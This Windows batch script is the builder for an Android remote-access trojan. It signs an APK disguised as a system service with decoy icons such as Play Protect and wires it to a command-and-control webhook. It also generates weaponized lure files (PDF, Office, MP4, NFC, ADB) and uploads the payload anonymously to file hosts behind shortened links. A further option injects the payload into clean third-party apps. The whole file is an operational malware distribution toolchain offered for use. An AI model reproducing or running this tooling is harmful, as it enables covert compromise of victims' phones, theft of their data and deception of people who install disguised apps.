@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

title Lab-RATS APK Builder v1.6.0 - by K4N3CO

set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"

goto :main_menu

:print_banner
cls
echo ┌───────────────────────────────────────────────────────────────────────┐
echo │                                  .-         .                         │
echo │                               ....-        :                          │
echo │                            -==--+:.+. ..  -..+:-+                     │
echo │                            ++---:+.-==+==#:.+---+#                    │
echo │                             :=---:+++++=++=**-:-:                     │
echo │                               --+++:-=+++++++-=                       │
echo │                  .-.         :--+==:++-:-**+-+-                       │
echo │                    -.     .==:--+:+++=++++++++#.                      │
echo │                    :-    =---=::-++.=:.=.-==+....                     │
echo │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │
echo │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │
echo │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │
echo │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │
echo │                .-=:  .---=++++-++++#####*++..::--. .                  │
echo │                 .--++.--:----=+---=-++#++==.       .                  │
echo │                   --------=--:=:-:-====+++-                           │
echo │                       .--++++--++:+++==:=+.                           │
echo │                        .:+++::::--:..:-+=                             │
echo │                       .--=+=-+-+    -:---*---                         │
echo │                                                                       │
echo │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │
echo │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │
echo │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │
echo │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │
echo │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
echo │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
echo │                                                                       │
echo │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │
echo │                                                                       │
echo │   The one's who MIND don't matter. The one's who MATTER don't mind.   │
echo │                         DEVELOPED BY K4N3CO                           │
echo │                               © 2026                                  │
echo └───────────────────────────────────────────────────────────────────────┘
echo.
goto :eof

:check_requirements
echo [*] Checking requirements...
echo.
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [!] Java JDK 17/21 is required.
    exit /b 1
) else (
    echo [✓] Java detected.
)
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [✓] keytool found.
)
if not exist "%PROJECT_DIR%\gradlew.bat" (
    echo [!] gradlew.bat not found in %PROJECT_DIR%
    exit /b 1
)
echo [✓] Requirements satisfied.
echo.
exit /b 0

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"
set "KEY_ALIAS=lab-rats-key"
set "KEYSTORE_PASS=lab-rats123"

if "%AUTO_KEYSTORE%"=="1" (
    if exist "%KEYSTORE_PATH%" goto :save_keystore_props
)

if exist "%KEYSTORE_PATH%" (
    echo [!] Keystore already exists.
    set /p "REGEN=    Generate new keystore? (y/N): "
    if /i not "!REGEN!"=="y" goto :save_keystore_props
    del /f "%KEYSTORE_PATH%" >nul 2>&1
)

echo [*] Keystore Configuration
set /p "KEY_ALIAS=    Key alias [lab-rats-key]: "
if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
set /p "KEYSTORE_PASS=    Password [lab-rats123]: "
if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"

keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity 9125 -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" >nul 2>&1
echo [✓] Keystore ready

:save_keystore_props
(
echo storeFile=lab-rats-keystore.jks
echo storePassword=!KEYSTORE_PASS!
echo keyAlias=!KEY_ALIAS!
echo keyPassword=!KEYSTORE_PASS!
) > "%PROJECT_DIR%\keystore.properties"
goto :eof

:configure_app
echo [*] App Configuration
set /p "APP_NAME=    Enter App Name [System Stability Service]: "
if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"

set /p "PKG_NAME=    Enter Package ID [com.android.system.stability]: "
if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"

set /a R1=%RANDOM% %% 4 + 1
set /a R2=%RANDOM% %% 10
set /a R3=%RANDOM% %% 10
set "DEFAULT_VER=!R1!.!R2!.!R3!"

set /p "VERSION_NAME=    Enter Version Name [!DEFAULT_VER!]: "
if "!VERSION_NAME!"=="" set "VERSION_NAME=!DEFAULT_VER!"

set /p "MIN_SDK=    Enter Min SDK [21]: "
if "!MIN_SDK!"=="" set "MIN_SDK=21"

echo.
echo [*] Decoy Identity Selection
echo     (The app logo will transform into your selection immediately after install on device)
echo     1. Play Protect (Shield - Default)  2. Calculator
echo     3. Weather                          4. System Update
echo     5. Lab-RATS Logo
set /p "DECOY_CHOICE=    Choice (Default 1): "
if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"

REM Update app/build.gradle
powershell -Command "(Get-Content '%PROJECT_DIR%\app\build.gradle') -replace 'applicationId \"[^\"]*\"', 'applicationId \"!PKG_NAME!\"' -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' -replace 'minSdk [0-9]*', 'minSdk !MIN_SDK!' | Set-Content '%PROJECT_DIR%\app\build.gradle'"

REM Update strings.xml
powershell -Command "(Get-Content '%PROJECT_DIR%\app\src\main\res\values\strings.xml') -replace '<string name=\"app_name\">.*</string>', '<string name=\"app_name\">!APP_NAME!</string>' | Set-Content '%PROJECT_DIR%\app\src\main\res\values\strings.xml'"

REM Write build_config.txt
(
echo PKG_NAME="!PKG_NAME!"
echo APP_NAME="!APP_NAME!"
echo VERSION_NAME="!VERSION_NAME!"
echo MIN_SDK="!MIN_SDK!"
echo DECOY_CHOICE="!DECOY_CHOICE!"
) > "%CONFIG_FILE%"

REM local.properties handling
set "EXISTING_WEBHOOK="
if exist "%PROJECT_DIR%\local.properties" (
    for /f "tokens=1,* delims==" %%A in ('type "%PROJECT_DIR%\local.properties"') do (
        if "%%A"=="WEBHOOK_URL" set "EXISTING_WEBHOOK=%%B"
    )
)

if defined EXISTING_WEBHOOK (
    echo     Current Webhook URL: !EXISTING_WEBHOOK!
    set /p "WEB_URL=    Enter C2 Webhook URL [Press Enter to Keep Current]: "
    if "!WEB_URL!"=="" set "WEB_URL=!EXISTING_WEBHOOK!"
) else (
    set /p "WEB_URL=    Enter C2 Webhook URL (Google Script or Render): "
)

REM Generate random 16-char ENCRYPTION_KEY
for /f "usebackq tokens=*" %%K in (`powershell -Command "-join ((65..90)+(97..122)+(48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})"` ) do set "RAND_KEY=%%K"

powershell -Command "$p = Get-Content '%PROJECT_DIR%\local.properties' -ErrorAction SilentlyContinue | Where-Object { $_ -notmatch '^(WEBHOOK_URL|DECOY_CHOICE|ENCRYPTION_KEY)=' }; $p += 'WEBHOOK_URL=!WEB_URL!'; $p += 'DECOY_CHOICE=!DECOY_CHOICE!'; $p += 'ENCRYPTION_KEY=!RAND_KEY!'; $p | Set-Content '%PROJECT_DIR%\local.properties'"

REM Generate dummy metadata files in assets
if not exist "%PROJECT_DIR%\app\src\main\assets\sys" mkdir "%PROJECT_DIR%\app\src\main\assets\sys"
powershell -Command "1..3 | ForEach-Object { $b = New-Object byte[] 512; (New-Object System.Random).NextBytes($b); [System.IO.File]::WriteAllBytes(\"%PROJECT_DIR%\app\src\main\assets\sys\metadata_$_.dat\", $b) }"

echo [✓] App configuration saved.
goto :eof

:build_apk
call :print_banner
echo [*] Initializing Build Engine...
cd /d "%PROJECT_DIR%"
call gradlew.bat assembleRelease --parallel
set "BUILD_STATUS=%errorlevel%"

if not exist "%SCRIPT_DIR%output" mkdir "%SCRIPT_DIR%output"
if %BUILD_STATUS% equ 0 if exist "app\build\outputs\apk\release\app-release.apk" (
    copy /Y "app\build\outputs\apk\release\app-release.apk" "%SCRIPT_DIR%output\signed_v1.apk" >nul
    echo.
    echo [✓] Success: apk-builder\output\signed_v1.apk
) else (
    echo.
    echo [!] BUILD FAILED. Check console output above.
)
cd /d "%SCRIPT_DIR%"
set /p "ENTER=    Press Enter to continue..."
goto :eof

:generate_exploit_standalone
set "TYPE=%~1"
set "URL=%~2"
set "EXTRA=%~3"
set "EXPLOIT_SRC=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
set "TEMP_BIN=%SCRIPT_DIR%bin"
if not exist "%TEMP_BIN%" mkdir "%TEMP_BIN%"

javac -sourcepath "%PROJECT_DIR%\app\src\main\java" -d "%TEMP_BIN%" "%EXPLOIT_SRC%" >nul 2>&1
if %errorlevel% equ 0 (
    if not exist "%SCRIPT_DIR%output" mkdir "%SCRIPT_DIR%output"
    cd /d "%SCRIPT_DIR%output"
    java -cp "%TEMP_BIN%" com.labs.labrats.exploits.ExploitLab "%TYPE%" "%URL%" "%EXTRA%"
    cd /d "%SCRIPT_DIR%"
) else (
    echo [!] Exploit compilation failed.
)
goto :eof

:exploit_menu
call :print_banner
echo [>] Weaponized Payload Lab (Hardened Tier)
echo.
echo     1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite
echo     4. Dolby Audio       5. ADB Script      6. Bluetooth Push
echo     7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle
echo     10. Office Word      11. Office Excel   12. Ghost GIF
echo     13. Priv-App Magisk Module ZIP
echo     14. Return to Main Menu
echo.
set /p "E_CHOICE=    Choice [1]: "
if "!E_CHOICE!"=="" set "E_CHOICE=1"

set "C2_URL=http://127.0.0.1:8080"
if exist "%PROJECT_DIR%\local.properties" (
    for /f "tokens=1,* delims==" %%A in ('type "%PROJECT_DIR%\local.properties"') do (
        if "%%A"=="WEBHOOK_URL" if not "%%B"=="" set "C2_URL=%%B"
    )
)

if "!E_CHOICE!"=="1" call :generate_exploit_standalone "mp4" "!C2_URL!" ""
if "!E_CHOICE!"=="2" (
    set /p "T=    Enter Title [URGENT_DOCUMENT]: "
    if "!T!"=="" set "T=URGENT_DOCUMENT"
    call :generate_exploit_standalone "pdf" "!C2_URL!" "!T!"
)
if "!E_CHOICE!"=="3" (
    set /p "S=    Enter Summary [Meeting_Invite]: "
    if "!S!"=="" set "S=Meeting_Invite"
    call :generate_exploit_standalone "ics" "!C2_URL!" "!S!"
)
if "!E_CHOICE!"=="4" call :generate_exploit_standalone "dolby" "!C2_URL!" ""
if "!E_CHOICE!"=="5" (
    set /p "TIP=    Target IP: "
    call :generate_exploit_standalone "adb" "!C2_URL!" "!TIP!"
)
if "!E_CHOICE!"=="6" call :generate_exploit_standalone "vcf" "!C2_URL!" "Android Update"
if "!E_CHOICE!"=="7" call :generate_exploit_standalone "ndef" "!C2_URL!" "uri"
if "!E_CHOICE!"=="8" call :generate_exploit_standalone "stego" "!C2_URL!" ""
if "!E_CHOICE!"=="9" call :generate_exploit_standalone "pwa" "!C2_URL!" "SystemUpdate"
if "!E_CHOICE!"=="10" call :generate_exploit_standalone "docx" "!C2_URL!" "Security_Audit"
if "!E_CHOICE!"=="11" call :generate_exploit_standalone "xlsx" "!C2_URL!" "Financial_Report"
if "!E_CHOICE!"=="12" call :generate_exploit_standalone "gif" "!C2_URL!" ""
if "!E_CHOICE!"=="13" call :generate_exploit_standalone "privapp" "!C2_URL!" ""
if "!E_CHOICE!"=="14" goto :eof

echo.
set /p "ENTER=    Press Enter to return to Lab..."
goto :exploit_menu

:infection_wizard
call :print_banner
echo [>] STRATEGIC_INFECTION_WIZARD
echo     Step-by-step automated payload weaponization.
echo.
call :check_requirements
if %errorlevel% neq 0 (
    set /p "ENTER=Press Enter to return..."
    goto :eof
)
set "AUTO_KEYSTORE=1"
call :generate_keystore
call :configure_app
call :build_apk
set "AUTO_KEYSTORE="

set "SIGNED_APK=%SCRIPT_DIR%output\signed_v1.apk"
if not exist "%SIGNED_APK%" (
    echo [!] Signed APK not found. Wizard aborted.
    set /p "ENTER=Press Enter to return..."
    goto :eof
)

echo.
echo [HOSTING] Select strategy:
echo     1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)
echo     2. Direct IP (IPv6)
echo     3. Custom / Pre-hosted Direct URL
set /p "H=    Choice: "
set "DOWNLOAD_URL="

if "!H!"=="2" (
    set /p "IP=    Target IPv6: "
    set "DOWNLOAD_URL=http://[!IP!]:9191/download/Update.apk"
) else if "!H!"=="3" (
    set /p "DOWNLOAD_URL=    Enter pre-hosted URL: "
) else (
    echo [*] Uploading to Catbox.moe...
    powershell -Command "$r = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'reqtype=fileupload' -F 'fileToUpload=@%SIGNED_APK%' https://catbox.moe/user/api.php 2>$null; if ($r -notlike 'http*') { Write-Host '[!] Catbox failed/unreachable. Trying Litterbox fallback...' -ForegroundColor Yellow; $r = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'reqtype=fileupload' -F 'time=72h' -F 'fileToUpload=@%SIGNED_APK%' https://litterbox.catbox.moe/resources/internals/api.php 2>$null }; if ($r -notlike 'http*') { Write-Host '[!] Litterbox failed. Trying Tmpfiles.org fallback...' -ForegroundColor Yellow; $j = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'file=@%SIGNED_APK%' https://tmpfiles.org/api/v1/upload 2>$null; if ($j -match '\"url\":\"([^\"]+)\"') { $r = $matches[1] -replace 'tmpfiles.org/', 'tmpfiles.org/dl/' } }; Set-Content -Path '%SCRIPT_DIR%temp_url.txt' -Value $r"
    if exist "%SCRIPT_DIR%temp_url.txt" (
        set /p DOWNLOAD_URL=<%SCRIPT_DIR%temp_url.txt
        del "%SCRIPT_DIR%temp_url.txt"
    )
    if "!DOWNLOAD_URL!"=="" (
        echo [!] Automated cloud uploads unreachable/failed on this network.
        set /p "DOWNLOAD_URL=    Enter custom / pre-hosted URL manually: "
    )
    if "!DOWNLOAD_URL!"=="" (
        echo [!] Upload failed / No valid URL provided.
        set /p "ENTER=Press Enter to return..."
        goto :eof
    )
    echo [✓] Hosted: !DOWNLOAD_URL!
    echo [*] Shortening delivery URL...
    powershell -Command "$s = curl.exe -s --connect-timeout 5 'https://is.gd/create.php?format=simple&url=!DOWNLOAD_URL!' 2>$null; if ($s -like 'http*') { Set-Content -Path '%SCRIPT_DIR%temp_short.txt' -Value $s }"
    if exist "%SCRIPT_DIR%temp_short.txt" (
        set /p SHORT_URL=<%SCRIPT_DIR%temp_short.txt
        del "%SCRIPT_DIR%temp_short.txt"
        if not "!SHORT_URL!"=="" (
            set "DOWNLOAD_URL=!SHORT_URL!"
            echo [✓] Shortened: !DOWNLOAD_URL!
        )
    )
)

echo.
echo [WEAPONIZE] Select Vector:
echo     1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite
echo     4. Dolby Audio     5. ADB Script    6. Bluetooth Push
echo     7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle
echo     10. Office Word    11. Office Excel 12. Ghost GIF
set /p "V=    Choice: "

if "!V!"=="1" call :generate_exploit_standalone "mp4" "!DOWNLOAD_URL!" ""
if "!V!"=="2" call :generate_exploit_standalone "pdf" "!DOWNLOAD_URL!" "Security_Audit"
if "!V!"=="3" call :generate_exploit_standalone "ics" "!DOWNLOAD_URL!" "Security_Sync"
if "!V!"=="4" call :generate_exploit_standalone "dolby" "!DOWNLOAD_URL!" ""
if "!V!"=="5" (
    set /p "TIP=    Target IP: "
    call :generate_exploit_standalone "adb" "!DOWNLOAD_URL!" "!TIP!"
)
if "!V!"=="6" call :generate_exploit_standalone "vcf" "!DOWNLOAD_URL!" "Android Update"
if "!V!"=="7" call :generate_exploit_standalone "ndef" "!DOWNLOAD_URL!" "uri"
if "!V!"=="8" call :generate_exploit_standalone "stego" "!DOWNLOAD_URL!" ""
if "!V!"=="9" call :generate_exploit_standalone "pwa" "!DOWNLOAD_URL!" "SystemUpdate"
if "!V!"=="10" call :generate_exploit_standalone "docx" "!DOWNLOAD_URL!" "Security_Patch"
if "!V!"=="11" call :generate_exploit_standalone "xlsx" "!DOWNLOAD_URL!" "Financial_Report"
if "!V!"=="12" call :generate_exploit_standalone "gif" "!DOWNLOAD_URL!" ""

echo.
echo DEPLOYMENT PACKAGE READY: !DOWNLOAD_URL!
set /p "ENTER=Press Enter to return..."
goto :eof

:show_help
call :print_banner
echo COMMAND_DOCUMENTATION_V1.6.0
echo ------------------------------------------------------------
echo 1. Start Build: Standard production flow.
echo 2. Keystore Only: Unique signing certificate.
echo 3. App Settings: Change ID, Name, and Version.
echo 4. Requirements: Check Java setup.
echo 5. Exploit Lab: Generate standalone tactical vectors.
echo 6. Infection Wizard: Full Build -^> Host -^> Weaponize.
echo 7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK.
echo ------------------------------------------------------------
set /p "ENTER=Press Enter..."
goto :eof

:main_menu
call :print_banner
echo [>] Build Options:
echo.
echo     1. Start Build (Configure & Build)
echo     2. Generate Keystore Only
echo     3. Configure App Settings Only
echo     4. Check Requirements
echo     5. Weaponized Payload Lab
echo     6. Generate Infection Chain Package (Wizard)
echo     7. Smali Surgery & APK Binder (Infect Clean APK)
echo     8. Help / Documentation
echo     9. Exit
echo.
set /p "MENU_OPTION=    Choose option (Default 1): "
if "!MENU_OPTION!"=="" set "MENU_OPTION=1"

if "!MENU_OPTION!"=="1" (
    call :check_requirements
    if !errorlevel! equ 0 (
        call :generate_keystore
        call :configure_app
        call :build_apk
    ) else (
        set /p "ENTER=Press Enter to return..."
    )
)
if "!MENU_OPTION!"=="2" (
    call :check_requirements
    if !errorlevel! equ 0 (
        call :generate_keystore
        set /p "ENTER=Press Enter to return..."
    ) else (
        set /p "ENTER=Press Enter to return..."
    )
)
if "!MENU_OPTION!"=="3" (
    call :configure_app
    set /p "ENTER=Press Enter to return..."
)
if "!MENU_OPTION!"=="4" (
    call :check_requirements
    set /p "ENTER=Press Enter to return..."
)
if "!MENU_OPTION!"=="5" call :exploit_menu
if "!MENU_OPTION!"=="6" call :infection_wizard
if "!MENU_OPTION!"=="7" (
    powershell -ExecutionPolicy Bypass -File "%SCRIPT_DIR%bind.ps1"
    set /p "ENTER=Press Enter to return..."
)
if "!MENU_OPTION!"=="8" call :show_help
if "!MENU_OPTION!"=="9" exit /b 0

if exist "%SCRIPT_DIR%bin" rmdir /s /q "%SCRIPT_DIR%bin" >nul 2>&1
goto :main_menu
